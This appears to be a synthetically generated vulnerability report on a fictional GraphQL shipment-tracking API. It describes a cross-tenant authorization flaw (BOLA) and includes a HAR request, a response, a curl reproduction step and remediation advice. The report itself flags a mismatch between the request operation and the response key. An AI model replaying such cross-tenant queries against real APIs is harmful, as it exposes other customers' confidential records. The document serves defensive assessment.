# Security Analysis Report
**System:** FreightLens Tracking API
**Domain:** Logistics / Supply Chain
**Example ID:** GQL-0263
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 10.2 | Parameter escalation (own session scope extension) on `getShipment` / `bulkShipmentLookup` — attacker reads shipments outside their session scope |

---

## Finding 1 — BOLA: Parameter Escalation on Shipment Resolver (Pattern 10.2)

### Summary
The GraphQL API at `https://api.freightlens-tracking.example.com/graphql` exposes a `getShipment` resolver that fetches by `shipmentId` without verifying the JWT `tenantId` claim matches the object's `tenantId`. Per RISK-GQL-263, the Redis cache is keyed only by `shipmentId` (no user dimension), amplifying cross-user exposure. The HAR shows the attacker sending a `bulkShipmentLookup` query; the server response returns data under the `getShipment` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request (§6.0 request body) uses the operation `bulkShipmentLookup(ids: ["S-2263","S-1263","S-3263"])`, while the HAR response (§6.0 response body) returns data under the key `getShipment`. These names conflict within context.txt. This analysis follows both artifacts faithfully: the request shape is `bulkShipmentLookup`, the response key is `getShipment`.

**Note:** `x-request-id: req-cb3fba22` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 10.2 — Parameter escalation (own session scope extension)
**Affected endpoint:** `POST https://api.freightlens-tracking.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (bulk)**
```
POST https://api.freightlens-tracking.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkShipmentLookup(ids: [\"S-2263\", \"S-1263\", \"S-3263\"]) { shipmentId tenantId data { sensitiveField } } }"}
```

**Response — Victim Shipment Record**
```json
{
  "data": {
    "getShipment": {
      "tenantId": "tenant-ba22",
      "ownerId": "other-user-cb3fba22",
      "data": {
        "sensitiveField": "CONFIDENTIAL-cb3fba22",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.freightlens-tracking.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkShipmentLookup(ids: [\"S-2263\",\"S-1263\",\"S-3263\"]) { shipmentId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-ba22, sensitiveField: CONFIDENTIAL-cb3fba22
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. Redis cache key must include user/tenant dimension: `shipment:{tenantId}:{shipmentId}`.
3. Validate bulk IDs list — reject IDs not belonging to the authenticated tenant.
